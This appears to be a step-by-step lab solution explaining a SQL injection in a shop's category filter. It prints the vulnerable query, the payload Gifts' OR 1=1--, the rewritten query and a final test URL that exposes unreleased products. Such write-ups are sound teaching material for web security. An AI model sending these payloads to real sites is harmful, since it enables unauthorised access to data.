The website is using this query in the backend when you choose a product category like "Gifts":

sql
Copy
Edit
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
This means:

Show only products where:

The category is 'Gifts'

AND the released flag is 1 (which means it's public/visible)

Your goal:
👉 Trick this query to also show unreleased products (those with released = 0), using SQL Injection.

🧪 Step-by-Step Explanation
🔍 Step 1: Find where to inject
You go to the product page and see categories like Gifts, Accessories, etc.
When you click on a category, it probably sends something like this in the URL:

arduino
Copy
Edit
https://example.com/filter?category=Gifts
So, category=Gifts is being used in the SQL query.

🧨 Step 2: Inject the payload
Now let’s use this input instead of just "Gifts":

vbnet
Copy
Edit
Gifts' OR 1=1--
Which makes the full query become:

sql
Copy
Edit
SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
🔍 What Just Happened?
Let’s understand this in human terms:

' → closes the original 'Gifts'

OR 1=1 → always true condition, so it matches all products

-- → comment, which tells SQL to ignore the rest (AND released = 1 is skipped)

So the query becomes:

sql
Copy
Edit
SELECT * FROM products WHERE category = 'Gifts' OR 1=1
✅ Boom! Now the database shows all products, including unreleased ones, because we bypassed the released = 1 filter.

💡 Final Input (URL)
So your final test URL would look like this:

arduino
Copy
Edit
https://example.com/filter?category=Gifts'+OR+1=1--
Or enter Gifts' OR 1=1-- in the category filter field (if it's in a form).

✅ Result
Once you do that, you should see hidden/unreleased products, which means:

🎉 Lab Solved!